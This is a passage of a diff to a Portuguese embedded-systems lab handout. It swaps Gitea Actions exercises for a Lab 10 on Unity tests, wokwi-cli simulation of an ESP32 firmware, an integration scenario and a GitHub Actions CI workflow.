-`.github/workflows/`). Ele só roda quando alguém clica em **Run workflow**. Depois do `push`,
-o que acontece com o **CI** (o `ci.yml` do Lab 10) no Gitea? E no GitHub?
+| Função                  | O que testar                                                                       |
+| ----------------------- | ---------------------------------------------------------------------------------- |
+| `adcParaSetpoint`       | extremos, meio, saturação abaixo de 0 e acima de 4095, passo de 0,5, monotonia     |
+| `mudouAlemDaBanda`      | exatamente na banda (não muda), 1 acima, para baixo, primeira leitura              |
+| `dutyDe`                | 0, 100, 50 (arredondamento), saturação                                             |
+| `decidir`               | pot, remoto (com saturação), a sequência do Lab 07, `SEM DHT`, ventilador em 100 % |
+| `interpretarModo`       | os 3 modos, maiúsculas, vazio, prefixo ("au"), palavra maior, `nullptr`            |
+| `interpretarPercentual` | válidos, `"12.5\r\n"`, fora da faixa, lixo, `"50abc"`, vazio                       |
+| `formatarPwm`           | JSON exato, `t` = NAN vira `null`, buffer pequeno não estoura                      |
 
-**P2:** o Gitea é um container **no mesmo servidor** do runner. O job vai conseguir resolver o
-nome `gitea`? E o `actions/checkout`, que baixa o código do Gitea, vai funcionar? Por quê?
+```powershell title="Terminal do PlatformIO"
+pio test -e native --junit-output-path relatorio-native.xml
+pio test -e native | Out-File -Encoding utf8 evidencias/t2-pio-test.txt
+```
+
+```text title="evidencias/t2-pio-test.txt (final)"
+test/test_logica/test_logica.cpp:187: test_json_buffer_pequeno_nao_estoura	[PASSED]
+---------------- native:test_logica [PASSED] Took 0.59 seconds ----------------
+
+=================================== SUMMARY ===================================
+Environment    Test         Status    Duration
+-------------  -----------  --------  ------------
+native         test_logica  PASSED    00:00:00.590
+================= 17 test cases: 17 succeeded in 00:00:00.590 =================
+```
+
+:::tip[Veja o teste falhar]
+Um teste que nunca falhou pode não testar nada. Troque, de propósito,
+`return roundf(sp * 2.0f) / 2.0f;` por `return roundf(sp);` em `adcParaSetpoint` e rode de
+novo. Qual teste falha, com que mensagem? O `pio test` termina com código **1**, e é isso que
+vai pintar o CI de vermelho na T5. Desfaça a mudança antes do commit.
 :::
 
-1. Copie o arquivo para as duas pastas e envie:
-
-   ```bash
-   mkdir -p .gitea/workflows
-   cp ci/diagnostico.yml .gitea/workflows/diagnostico.yml
-   cp ci/diagnostico.yml .github/workflows/diagnostico.yml
-   git add .gitea .github && git commit -m "T2: diagnostico do runner" && git push
-   ```
-
-2. Confira o **P1** na aba Actions do Gitea e na do GitHub.
-3. Rode o diagnóstico nos dois: **Actions → Diagnóstico do runner → Run workflow** (ramo
-   `main`). Copie o log de cada um para `evidencias/t2-diagnostico-gitea.txt` e
-   `evidencias/t2-diagnostico-github.txt`.
-4. Preencha no `README.md` a tabela **O que o job enxerga**, com as duas colunas.
-
-:::warning[Por que Docker-in-Docker]
-O jeito mais simples de montar um runner é dar a ele o `/var/run/docker.sock` do servidor. Aí
-cada job vira um container **irmão** do Gitea, do Mosquitto e dos Node-RED. Responda no P2: o
-que um workflow de qualquer grupo conseguiria fazer com esse socket?
+:::tip[Preveja antes de rodar]
+**P1:** um colega escreveu `/ 4096.0f` em vez de `/ 4095` em `adcParaSetpoint`. Quais dos seus
+testes falham? Escreva a previsão e **depois** rode. Se nenhum falhar, descubra por quê (para
+quantos dos 4096 valores do ADC o resultado muda?) e escreva um teste que **pegue** esse erro.
 :::
 
 <FileTree
-  root="lab11-grupo-X"
-  files={[
-    ".gitea/workflows/diagnostico.yml c",
-    ".github/workflows/diagnostico.yml c",
-    "evidencias/t2-diagnostico-gitea.txt c",
-    "evidencias/t2-diagnostico-github.txt c",
-    "README.md u",
-  ]}
+  root="lab10-grupo-X"
+  files={["test/test_logica/test_logica.cpp c", "evidencias/t2-pio-test.txt c"]}
 />
 
 <CommitPoint
   id="t2"
-  task="O que o job enxerga"
-  pontos={15}
-  files=".gitea/workflows/diagnostico.yml .github/workflows/diagnostico.yml evidencias/t2-diagnostico-gitea.txt evidencias/t2-diagnostico-github.txt README.md"
+  task="pio test no PC"
+  pontos={20}
+  files="test/test_logica/test_logica.cpp evidencias/t2-pio-test.txt"
 />
 
 ---
 
-## Parte 3 — O pipeline portado para o Gitea {/* #parte-3 */} {/* #t3 */}
+## Parte 3 — `wokwi-cli`: lint e testes no ESP32 simulado {/* #parte-3 */}
 
-Depois da T2, o Gitea só enxerga `.gitea/workflows/`. O CI volta quando o `ci.yml` estiver lá.
-Comece pela cópia:
+### 3.1 Instalar e configurar o token
 
-```bash
-cp .github/workflows/ci.yml .gitea/workflows/ci.yml
+```powershell title="Terminal (raiz do repositório)"
+curl.exe -L -o wokwi-cli.exe https://github.com/wokwi/wokwi-cli/releases/download/v0.28.1/wokwi-cli-win-x64.exe
+.\wokwi-cli.exe --version                       # 0.28.1
+$env:WOKWI_CLI_TOKEN = "cole-aqui-o-token"      # só nesta janela do terminal
 ```
 
-Quase tudo funciona como está: `actions/checkout`, `setup-python`, `cache`, `upload-artifact`
-e `download-artifact` vêm do github.com e falam com o Gitea. `needs`, `outputs`, `if:`,
-`concurrency`, `permissions` e o `$GITHUB_STEP_SUMMARY` também. Três coisas mudam.
+No Linux e no macOS, baixe `wokwi-cli-linuxstatic-x64` ou `wokwi-cli-macos-arm64` e use
+`export WOKWI_CLI_TOKEN=...`. O `.gitignore` já ignora o executável.
 
-### 3.1 O link da execução
+:::warning[O token é uma senha]
+Nunca coloque o token num arquivo do repositório, nem no `ci.yml`. No GitHub, ele vai num
+**Secret** (T5). Quem tem o token gasta a sua cota.
+:::
 
-No Gitea, `github.server_url` é o `ROOT_URL` e **termina em `/`**
-(`http://192.168.0.10/git/`). O link montado como no Lab 10 sai com barra dupla. Monte-o no
-script, cortando a barra com `${SERVER_URL%/}`. O caminho é o mesmo do GitHub
-(`/actions/runs/<run_id>`). O botão da notificação passa a dizer **Gitea**. E, num PR, o
-`github.ref_name` do Gitea é só o **número** do PR (o ref é `refs/pull/1/head`); o nome do ramo
-está no `github.head_ref`:
+### 3.2 Lint do diagrama (sem token)
 
-```diff title=".gitea/workflows/ci.yml (job notificar, passo Publica no ntfy)"
-         env:
-           NTFY_URL: ${{ vars.NTFY_URL }}
-           NTFY_TOPIC: ${{ secrets.NTFY_TOPIC }}
-           NTFY_TOKEN: ${{ secrets.NTFY_TOKEN }}
--          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
-+          CI_NOME: Gitea
-+          # no Gitea, server_url é o ROOT_URL e termina em "/": o link é montado no script
-+          SERVER_URL: ${{ github.server_url }}
-+          RUN_ID: ${{ github.run_id }}
-           # tudo o que vem do usuário entra por variável de ambiente, NUNCA direto no "run:"
-           COMMIT_MSG: ${{ github.event.head_commit.message || github.event.pull_request.title }}
--          REF_NAME: ${{ github.ref_name }}
-+          REF_NAME: ${{ github.head_ref || github.ref_name }}   # num PR: o ramo, não o nº do PR
- ...
-         run: |
-+          export RUN_URL="${SERVER_URL%/}/${REPO}/actions/runs/${RUN_ID}"
-           resultado=success
+```powershell title="Terminal"
+.\wokwi-cli.exe lint --warnings-as-errors . | Out-File -Encoding utf8 evidencias/t3-lint.txt
 ```
 
-### 3.2 A release
+O `diagram.json` do Lab 07 **não passa**: o `lint` acusa um atributo que o analisador lógico
+não tem. Corrija o diagrama até sair só a nota `info` sobre a placa. Aproveite e mude o valor
+inicial do potenciômetro para `0`: o teste de integração (T4) precisa começar de um estado
+**conhecido**.
 
-O `softprops/action-gh-release` fala a API **do GitHub** e não serve aqui. O
-`ci/release_gitea.py` (pronto) faz o mesmo pela API do Gitea, com o token do job:
-
-1. procura a release da tag (`GET /releases/tags/<tag>`) e, se não existir, cria
-   (`POST /releases`); tag com `-` (como `v1.1.0-rc1`) vira **pré-release**;
-2. anexa cada arquivo (`POST /releases/<id>/assets`) e troca o que já tiver o mesmo nome, para
-   um **re-run** não duplicar nada;
-3. escreve o link no resumo do job.
-
-```yaml title=".gitea/workflows/ci.yml (job publicar)"
-publicar:
-  name: Release com o firmware
-  needs: [firmware, simulacao]
-  if: startsWith(github.ref, 'refs/tags/v')
-  runs-on: ubuntu-latest
-  permissions:
-    contents: write # o GITEA_TOKEN deste job pode criar a release
-  steps:
-    - uses: actions/checkout@v4
-      with:
-        sparse-checkout: ci
-
-    - uses: actions/setup-python@v5 # o script da release só usa a biblioteca padrão
-      with:
-        python-version: "3.12"
-
-    - uses: actions/download-artifact@v4
-      with:
-        name: firmware
-        path: saida
-
-    # no lugar do softprops/action-gh-release (que fala a API do GitHub): a API do Gitea
-    - name: Cria a release e anexa o firmware (API do Gitea)
-      env:
-        GITEA_TOKEN: ${{ secrets.GITEA_TOKEN }}
-        API: ${{ github.api_url }}/repos/${{ github.repository }} # api_url = <ROOT_URL>api/v1
-        TAG: ${{ github.ref_name }}
-        SERVER_URL: ${{ github.server_url }}
-        RUN_ID: ${{ github.run_id }}
-      run: |
-        export RUN_URL="${SERVER_URL%/}/${GITHUB_REPOSITORY}/actions/runs/${RUN_ID}"
-        python3 ci/release_gitea.py "$TAG" \
-          saida/firmware.bin saida/bootloader.bin saida/partitions.bin saida/firmware.elf
+```json title="diagram.json (as duas peças alteradas)"
+{ "type": "wokwi-potentiometer", "id": "pot1", "top": 160, "left": -150, "attrs": { "value": "0" } },
+{ "type": "wokwi-logic-analyzer", "id": "logic1", "top": 300, "left": 300, "attrs": { "filename": "lab10-pwm" } }
 ```
 
-### 3.3 Os secrets
+(Mantenha `top` e `left` como estão no seu arquivo.)
 
-Atualize o comentário do topo: no Gitea, os secrets e a variable vêm da **organização**. Um
-secret com o mesmo nome no **repositório** (Configurações → Actions → Secrets) tem precedência:
-é assim que um grupo usaria outro tópico do ntfy sem mexer no da organização.
+### 3.3 Os testes Unity no ESP32 simulado
 
-### 3.4 Conferir
+O mesmo `test_logica.cpp` também roda **no ESP32**, onde mudam o compilador (Xtensa), o
+tamanho de `long` e a FPU. E uma segunda pasta testa o que só existe lá, o LEDC e o ADC:
 
-```bash
-git add .gitea/workflows/ci.yml && git commit -m "T3: pipeline no Gitea Actions" && git push
+<FileTree root="lab10-grupo-X" files={["test/test_alvo/test_alvo.cpp c"]} />
+
+```cpp title="test/test_alvo/test_alvo.cpp (trecho)"
+void test_ledc_aquecedor_5hz() {
+    uint32_t f = pwmIniciar(AQ_PIN, 0, 5);
+    TEST_ASSERT_UINT32_WITHIN(1, 5, f);               // o LEDC consegue gerar 5 Hz em 8 bits
+    pwmEscrever(AQ_PIN, 0, dutyDe(50));
+    TEST_ASSERT_EQUAL_UINT32(128, pwmLer(AQ_PIN, 0)); // ledcRead() devolve o duty escrito
+}
+
+void test_ledc_ventilador_25khz() {
+    uint32_t f = pwmIniciar(VE_PIN, 1, 25000);
+    TEST_ASSERT_UINT32_WITHIN(250, 25000, f);         // ±1 %
+    pwmEscrever(VE_PIN, 1, dutyDe(63));
+    TEST_ASSERT_EQUAL_UINT32(161, pwmLer(VE_PIN, 1));
+}
+
+void test_adc_do_potenciometro() {
+    analogReadResolution(12);
+    analogSetPinAttenuation(POT_PIN, ADC_11db);
+    int raw = analogRead(POT_PIN);
+    TEST_ASSERT_INT_WITHIN(2048, 2047, raw);          // 0..4095
+    TEST_ASSERT_TRUE(adcParaSetpoint(raw) >= SP_MIN && adcParaSetpoint(raw) <= SP_MAX);
+}
+// pwmIniciar/pwmEscrever/pwmLer: os mesmos #if ESP_ARDUINO_VERSION_MAJOR >= 3 do Lab 07
+// (no core 2.x, ledcSetup() devolve a frequência obtida; no 3.x, ledcReadFreq(pino))
 ```
 
-No Gitea, a execução precisa ficar **verde** em todos os jobs (`publicar` aparece como pulado:
-não é tag). No celular, a notificação agora abre a execução **no Gitea**. Na lista de commits,
-o commit ganha o ✓ (é um _status_ por job: `CI / Testes da lógica (pio test -e native) (push)`).
-No GitHub, o `.github/workflows/ci.yml` continua rodando igual.
+O `pio test` **compila** o teste para o ESP32 e para (não há placa para gravar). O `wokwi-cli`
+**roda** o `.elf` e decide pelo texto do serial:
+
+```powershell title="Terminal"
+foreach ($t in "test_logica", "test_alvo") {
+  pio test -e esp32dev -f $t --without-uploading --without-testing
+  .\wokwi-cli.exe --elf .pio/build/esp32dev/firmware.elf --timeout 30000 `
+    --expect-text "Tests 0 Failures" --fail-text ":FAIL" `
+    --serial-log-file "evidencias/t3-alvo-$t.txt" .
+}
+```
+
+```text title="Saída esperada (test_alvo)"
+Wokwi CLI v0.28.1 (7cf4ffaebfd8)
+Connected to Wokwi Simulation API <versão>
+Starting simulation...
+test/test_alvo/test_alvo.cpp:82:test_ledc_aquecedor_5hz:PASS
+test/test_alvo/test_alvo.cpp:83:test_ledc_ventilador_25khz:PASS
+test/test_alvo/test_alvo.cpp:84:test_adc_do_potenciometro:PASS
+test/test_alvo/test_alvo.cpp:85:test_float_no_xtensa_igual_ao_pc:PASS
+
+-----------------------
+4 Tests 0 Failures 0 Ignored
+
+Expected text found: "Tests 0 Failures"
+TEST PASSED.
+```
+
+- `--elf` troca o firmware do `wokwi.toml` (que aponta para o firmware normal) pelo programa
+  de teste.
+- `--expect-text` encerra com **sucesso** quando o texto aparece; `--fail-text` encerra com
+  **erro** se o seu texto aparecer antes. O Unity escreve `:FAIL` em cada teste que falha.
+- Se nada disso aparecer até o `--timeout`, o `wokwi-cli` sai com o código **42**.
+
+:::tip[Preveja antes de rodar]
+**P2:** `formatarPwm` faz `(unsigned long)dutyDe(...)` antes do `%lu`. No PC (x86-64), quantos
+bytes tem um `long`? E no ESP32? E o `uint32_t`: é `unsigned int` ou `unsigned long` em cada
+um? O que poderia dar errado se o cast não existisse, e por que um teste que passa no PC
+**ainda assim** precisa rodar no ESP32?
+:::
 
 <FileTree
-  root="lab11-grupo-X"
+  root="lab10-grupo-X"
   files={[
-    ".gitea/workflows/ci.yml c",
-    "evidencias/t3-gitea-actions.png c",
-    "README.md u",
+    "test/test_alvo/test_alvo.cpp c",
+    "diagram.json u",
+    "evidencias/t3-lint.txt c",
+    "evidencias/t3-alvo-test_logica.txt c",
+    "evidencias/t3-alvo-test_alvo.txt c",
   ]}
 />
 
 <CommitPoint
   id="t3"
-  task="Pipeline portado para o Gitea Actions"
-  pontos={20}
-  files=".gitea/workflows/ci.yml evidencias/t3-gitea-actions.png README.md"
+  task="wokwi-cli: lint e testes no ESP32 simulado"
+  pontos={15}
+  files="test/test_alvo/test_alvo.cpp diagram.json evidencias/t3-lint.txt evidencias/t3-alvo-test_logica.txt evidencias/t3-alvo-test_alvo.txt"
 />
 
 ---
 
-## Parte 4 — Fila e cache {/* #parte-4 */} {/* #t4 */}
+## Parte 4 — Cenário de integração e analisador lógico {/* #parte-4 */}
 
-Num runner da turma, o tempo até o resultado tem duas partes: a **fila** (esperar uma vaga) e a
-**duração** dos jobs, que depende muito do **cache**. Sem cache, cada job de firmware baixa
-de novo o toolchain do ESP32 (centenas de MB). O `ci/duracoes.py` lê os tempos pela API do
-Gitea:
+Os testes unitários verificam cada função. Falta verificar o **firmware inteiro**: `setup()`,
+os `Ticker`, a banda morta do ADC, o DHT22, a serial e o LEDC funcionando juntos. É o que um
+**cenário** faz: uma lista de passos que o `wokwi-cli` executa enquanto o firmware roda.
 
-```bash
-export GITEA_TOKEN=<o token do passo 1.2>      # no PowerShell: $env:GITEA_TOKEN="..."
-python ci/duracoes.py http://<IP do LAB IoT>/git lab11-grupo-x/camara-ci 5
+| Passo          | O que faz                            | Exemplo                                            |
+| -------------- | ------------------------------------ | -------------------------------------------------- |
+| `wait-serial`  | espera um trecho na saída serial     | `wait-serial: '[BOOT] pronto'`                     |
+| `set-control`  | mexe num componente                  | `part-id: pot1`, `control: position`, `value: 0.5` |
+| `write-serial` | digita na serial do ESP32            | `write-serial: "modo auto\r\n"`                    |
+| `expect-pin`   | confere o nível de um pino **agora** | `part-id: esp`, `pin: '25'`, `value: 0`            |
+| `delay`        | espera (com unidade!)                | `delay: 1500ms`                                    |
+
+Cada passo tem **um** comando (e um `name` opcional). O potenciômetro aceita `position` de
+0,0 a 1,0; o DHT22, `temperature` (°C).
+
+<FileTree root="lab10-grupo-X" files={["ci/cenario_integracao.yaml c"]} />
+
+```yaml title="ci/cenario_integracao.yaml"
+name: Camara - modos pot e auto
+version: 1
+author: ELT85B
+
+# O diagram.json começa com o potenciômetro em 0 e o DHT22 em 24,5 °C: estado conhecido.
+steps:
+  - name: Boot sem rede
+    wait-serial: "[BOOT] pronto"
+
+  # ---------------------------------------------------------- modo pot (dimmer)
+  - name: Potenciômetro no meio
+    set-control:
+      part-id: pot1
+      control: position
+      value: 0.5
+  - name: Os dois canais vão a 50 %
+    wait-serial: '"modo":"pot","estado":"MANUAL","aq":50,"ve":50,"aq_duty":128,"ve_duty":128'
+  - name: Deixa o PWM rodar (o verificar_pwm.py mede 5 Hz e 25 kHz a 50 % aqui)
+    delay: 1500ms
+
+  - name: Potenciômetro no zero
+    set-control:
+      part-id: pot1
+      control: position
+      value: 0
+  - name: Tudo desligado
+    wait-serial: '"aq":0,"ve":0,"aq_duty":0,"ve_duty":0'
+  - name: Pino do aquecedor em nível baixo
+    expect-pin:
+      part-id: esp
+      pin: "25"
+      value: 0
+
+  # ---------------------------------------------------------- modo auto (Lab 07, T6)
+  - name: DHT22 a cada 2 s
+    write-serial: "intervalo 2\r\n"
+  - name: Setpoint 37,5 °C pelo potenciômetro
+    set-control:
+      part-id: pot1
+      control: position
+      value: 0.5
+  - name: Liga o modo auto (o DHT22 começa em 24,5 °C, atributo do diagram.json)
+    write-serial: "modo auto\r\n"
+  - name: Aquece
+    wait-serial: '"modo":"auto","estado":"AQUECENDO","aq":100,"ve":0'
+
+  - name: Passa de SP + 0,5
+    set-control:
+      part-id: dht1
+      control: temperature
+      value: 38.2
+  - name: Estável, aquecedor desligado
+    wait-serial: '"estado":"ESTAVEL","aq":0,"ve":0'
+
+  - name: Bem acima do setpoint
+    set-control:
+      part-id: dht1
+      control: temperature
+      value: 41
+  - name: Ventilador proporcional (41 - 38,5) x 25 = 63 %
+    wait-serial: '"estado":"RESFRIANDO","aq":0,"ve":63,"aq_duty":0,"ve_duty":161'
+
+  - name: Comando inválido não derruba o firmware
+    write-serial: "modo turbo\r\n"
+  - name: Resposta de erro
+    wait-serial: "modo invalido"
 ```
 
-```text title="Formato da saída (valores ilustrativos)"
-| execução | ref | resultado | fila | Testes da lógica | Firmware | Simulação no Wokwi | Release com o firmware | Notificação | total |
-|---|---|---|---|---|---|---|---|---|---|
-| #4 | main | success | 3s | 41s | 2min10s | 1min05s | pulado | 6s | 4min12s |
+O `wait-serial` só olha o que chega **depois** do passo anterior. Por isso o potenciômetro
+começa em 0: se começasse no meio, o `[PWM]` de 50 % sairia no `setup()`, **antes** do
+`[BOOT] pronto`, e o passo "Os dois canais vão a 50 %" esperaria para sempre.
+
+Com `--vcd-file`, o `wokwi-cli` grava o **analisador lógico** (D0 = GPIO25, D1 = GPIO26) num
+arquivo VCD, o mesmo formato que o PulseView abre. O `ci/verificar_pwm.py` (pronto, só
+biblioteca padrão) procura em cada canal um trecho com a frequência e o duty esperados:
+
+```powershell title="Terminal"
+pio run -e ci
+.\wokwi-cli.exe --elf .pio/build/ci/firmware.elf --scenario ci/cenario_integracao.yaml `
+  --timeout 90000 --vcd-file pwm.vcd --serial-log-file serial-cenario.txt . 2>&1 |
+  Out-File -Encoding utf8 evidencias/t4-cenario.txt
+py ci/verificar_pwm.py pwm.vcd --listar | Out-File -Encoding utf8 evidencias/t4-pwm.txt
 ```
 
-A coluna **fila** é o tempo do `push` até o primeiro job começar. A partir daí, os jobs de uma
-execução podem esperar de novo por vaga entre um e outro.
+```text title="evidencias/t4-cenario.txt (trecho)"
+[Camara - modos pot e auto] Executing step: Os dois canais vão a 50 %
+[ADC] {"raw":2048,"mv":1550,"sp":37.5}
+[PWM] {"modo":"pot","estado":"MANUAL","aq":50,"ve":50,"aq_duty":128,"ve_duty":128,"sp":37.5,"t":null}
+[Camara - modos pot e auto] Expected text matched: "..."
+...
+[PWM] {"modo":"auto","estado":"RESFRIANDO","aq":0,"ve":63,"aq_duty":0,"ve_duty":161,"sp":37.5,"t":41.0}
+[Camara - modos pot e auto] Scenario completed successfully
+```
 
-1. **Cache frio**: acrescente `v2-` no começo das duas chaves de cache (`key: v2-pio-...` no
-   job `testes` e `key: v2-pio-esp32-...` no `firmware`), faça commit e push. Chave nova é cache
-   vazio.
-2. **Cache quente**: sem mudar nada, `git commit --allow-empty -m "cache quente"` e push.
-3. **A turma toda**: no sinal do professor, todos os grupos fazem um push ao mesmo tempo.
-4. Rode o `duracoes.py`, salve a tabela em `evidencias/t4-duracoes.md` e escreva no `README.md`
-   a análise: quanto o cache economiza, em que job, e quanto foi fila no passo 3.
+```text title="evidencias/t4-pwm.txt (formato)"
+pwm.vcd: sinais D0, D1
+       D0/D0:      7 períodos        5.00 Hz  duty  50.0 %
+ok     D0 (aquecedor GPIO25): 5.00 Hz, duty 50.0 % em 7 períodos
+       D1/D1:  37500 períodos    25000.00 Hz  duty  50.0 %
+ok     D1 (ventilador GPIO26): 25000.00 Hz, duty 50.0 % em 37500 períodos
+```
 
 :::tip[Preveja antes de rodar]
-**P3:** (a) o runner tem 2 vagas e 8 grupos fazem push juntos, cada execução com duração total
-D (a soma dos jobs, que você mediu nos passos 1 e 2). Quanto tempo leva até a **última**
-execução terminar? E a **primeira**? Pense em como o Gitea escolhe o próximo job. (b) A chave do
-cache é `pio-Linux-6.2.0-<hash do platformio.ini>`, a **mesma** em todos os grupos. Se o cache
-fosse um só para o runner inteiro, o que um grupo poderia fazer com o firmware de outro?
+**P3:** por que o cenário confere o pino 25 com `expect-pin` só quando o aquecedor está em
+**0 %**, e não em 100 %? (Dica: com 8 bits, qual é o duty máximo, 255/255 ou 255/256? Em quantos
+microssegundos por período o pino fica em 0 a 5 Hz?) Um teste que passa 99 vezes e falha 1 é
+chamado de **instável** (_flaky_). Por que ele é pior do que um teste que sempre falha?
 :::
 
 <FileTree
-  root="lab11-grupo-X"
+  root="lab10-grupo-X"
   files={[
-    ".gitea/workflows/ci.yml u",
-    "evidencias/t4-duracoes.md c",
-    "README.md u",
+    "ci/cenario_integracao.yaml c",
+    "evidencias/t4-cenario.txt c",
+    "evidencias/t4-pwm.txt c",
   ]}
 />
 
 <CommitPoint
   id="t4"
-  task="Fila e cache"
-  pontos={15}
-  files=".gitea/workflows/ci.yml evidencias/t4-duracoes.md README.md"
+  task="Cenario de integracao e analisador logico"
+  pontos={20}
+  files="ci/cenario_integracao.yaml evidencias/t4-cenario.txt evidencias/t4-pwm.txt"
 />
 
 ---
 
-## Parte 5 — Release no Gitea com o token do job {/* #parte-5 */} {/* #t5 */}
+## Parte 5 — Pipeline no GitHub Actions {/* #parte-5 */}
 
-Cada job recebe um **token próprio**, o `GITEA_TOKEN`. Ele vale só para o repositório do job e
-só enquanto o job roda, com as permissões do bloco `permissions:`. No topo do workflow, ele só
-**lê** (`contents: read`). Apenas o job `publicar` pede `contents: write`.
+### 5.1 Conceitos
 
-:::tip[Preveja antes de rodar]
-**P4:** (a) sem o `permissions: contents: write` no job `publicar`, o que acontece ao criar a
-release? Com que código HTTP? (b) O `GITEA_TOKEN` de um job do seu grupo consegue ler o
-repositório de **outro** grupo? Com que resposta? (c) Um PR de um ramo do seu repositório
-recebe os secrets da organização? E um PR vindo de um **fork**?
-:::
+- **Workflow**: um arquivo YAML em `.github/workflows/`. Diz **quando** roda (`on:`) e **o
+  quê** (`jobs:`).
+- **Job**: roda numa máquina virtual nova (`runs-on: ubuntu-latest`). Jobs rodam em
+  **paralelo**, a não ser que um dependa do outro (`needs:`).
+- **Step**: um comando (`run:`) ou uma ação pronta (`uses:`).
+- **Artefato**: arquivo que um job entrega para outro, ou para você baixar
+  (`upload-artifact`/`download-artifact`).
+- **Cache**: guarda o `~/.platformio` entre execuções. Sem ele, todo `push` baixa de novo o
+  toolchain do ESP32, uns 300 MB.
+- **Secret**: valor sensível (token) que o workflow lê como `${{ secrets.NOME }}`. O GitHub
+  esconde o valor nos logs e **não** o entrega a PRs de forks.
 
-1. **O experimento**: apague o bloco `permissions:` do job `publicar`, faça commit, crie a tag
-   `v1.1.0-rc1` e envie **só para o Gitea**:
+### 5.2 Secrets e variáveis
 
-   ```bash
-   git commit -am "experimento: publicar sem contents: write"
-   git tag v1.1.0-rc1
-   git push lab main v1.1.0-rc1
-   ```
+Em **Settings ▸ Secrets and variables ▸ Actions**:
 
-   Copie do log do job `publicar` o erro para `evidencias/t5-403.txt`.
+| Tipo     | Nome              | Valor                                               |
+| -------- | ----------------- | --------------------------------------------------- |
+| Secret   | `WOKWI_CLI_TOKEN` | o token do Wokwi CI                                 |
+| Secret   | `NTFY_TOPIC`      | o tópico do grupo (T6)                              |
+| Secret   | `NTFY_TOKEN`      | o token do ntfy (T6; vazio no `ntfy.sh` sem login)  |
+| Variable | `NTFY_URL`        | o servidor do ntfy (T6; sem ela, `https://ntfy.sh`) |
 
-2. **A release**: devolva o `permissions:`, faça commit e crie a tag `v1.1.0`. Com as duas URLs
-   de push, ela vai para os dois. O GitHub publica pelo `.github/workflows/ci.yml`, e o Gitea
-   pelo `.gitea/workflows/ci.yml`:
+### 5.3 O workflow
 
-   ```bash
-   git commit -am "T5: release no Gitea"
-   git tag v1.1.0
-   git push && git push origin v1.1.0
-   ```
+<FileTree root="lab10-grupo-X" files={[".github/workflows/ci.yml c"]} />
 
-3. Em **Releases** no Gitea: `v1.1.0` com `firmware.bin`, `bootloader.bin`, `partitions.bin` e
-   `firmware.elf`. Captura em `evidencias/t5-release.png` e o link no `README.md`. O
-   experimento criou alguma release (`v1.1.0-rc1`) no Gitea? Explique no P4.
+```yaml title=".github/workflows/ci.yml (jobs testes, firmware e simulacao)"
+name: CI
 
-:::note[O token deveria morrer com o job]
-Num Gitea 28.1 de teste, um `GITEA_TOKEN` usado durante o job continuou aceito depois que o
-job terminou, até o Gitea reiniciar (o Gitea guarda o token num cache em memória). Por isso
-vale a regra de qualquer CI: nunca imprima um token no log, e dê a cada job só a permissão de
-que ele precisa.
-:::
+on:
+  push:
+    branches: [main]
+    tags: ["v*"]
+  pull_request:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency: # um push novo cancela a execução anterior do mesmo ramo
+  group: ci-${{ github.ref }}
+  cancel-in-progress: true
+
+env:
+  PLATFORMIO_VERSAO: "6.2.0"
+  WOKWI_CLI_VERSAO: "v0.28.1"
+
+jobs:
+  testes:
+    name: Testes da lógica (pio test -e native)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Cache do PlatformIO
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.platformio
+            ~/.cache/pip
+          key: pio-${{ runner.os }}-${{ env.PLATFORMIO_VERSAO }}-${{ hashFiles('platformio.ini') }}
+      - name: Instala o PlatformIO
+        run: pip install "platformio==${PLATFORMIO_VERSAO}"
+      - name: Testes (Unity, no PC)
+        run: pio test -e native --junit-output-path relatorio-native.xml
+      - name: Resumo dos testes
+        if: always()
+        run: |
+          if [ -f relatorio-native.xml ]; then
+            python ci/resumo_junit.py relatorio-native.xml >> "$GITHUB_STEP_SUMMARY"
+          fi
+      - name: Instala o wokwi-cli
+        run: |
+          mkdir -p "$HOME/.local/bin"
+          curl -sSfL -o "$HOME/.local/bin/wokwi-cli" \
+            "https://github.com/wokwi/wokwi-cli/releases/download/${WOKWI_CLI_VERSAO}/wokwi-cli-linuxstatic-x64"
+          chmod +x "$HOME/.local/bin/wokwi-cli"
+          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
+      - name: Lint do diagram.json (não precisa de token)
+        run: wokwi-cli lint --warnings-as-errors .
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: relatorio-testes
+          path: relatorio-native.xml
+          if-no-files-found: ignore
+
+  firmware:
+    name: Firmware (esp32dev, ci e testes para o alvo)
+    needs: testes
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Cache do PlatformIO
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.platformio
+            ~/.cache/pip
+          key: pio-esp32-${{ runner.os }}-${{ env.PLATFORMIO_VERSAO }}-${{ hashFiles('platformio.ini') }}
+      - name: Instala o PlatformIO
+        run: pip install "platformio==${PLATFORMIO_VERSAO}"
+      # os testes para o alvo usam a MESMA pasta .pio/build/esp32dev: compila um por vez e
+      # copia o .elf antes de compilar o próximo (e o firmware normal por último)
+      - name: Testes compilados para o ESP32
+        run: |
+          mkdir -p saida
+          for t in test_logica test_alvo; do
+            pio test -e esp32dev -f "$t" --without-uploading --without-testing
+            cp .pio/build/esp32dev/firmware.elf "saida/teste_${t}.elf"
+          done
+      - name: Firmware do CI (sem rede)
+        run: |
+          pio run -e ci
+          cp .pio/build/ci/firmware.elf saida/firmware_ci.elf
+      - name: Firmware normal
+        run: |
+          pio run -e esp32dev
+          cp .pio/build/esp32dev/firmware.bin .pio/build/esp32dev/firmware.elf saida/
+          cp .pio/build/esp32dev/bootloader.bin .pio/build/esp32dev/partitions.bin saida/
+          pio run -e esp32dev -t size | tail -n 3 >> "$GITHUB_STEP_SUMMARY"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: firmware
+          path: saida/
+          retention-days: 14
+
+  simulacao:
+    name: Simulação no Wokwi (wokwi-cli)
+    needs: firmware
+    runs-on: ubuntu-latest
+    outputs:
+      simulou: ${{ steps.token.outputs.ok }}
+    env:
+      WOKWI_CLI_TOKEN: ${{ secrets.WOKWI_CLI_TOKEN }}
+    steps:
+      - name: Tem token do Wokwi?
+        id: token
+        run: |
+          if [ -n "$WOKWI_CLI_TOKEN" ]; then
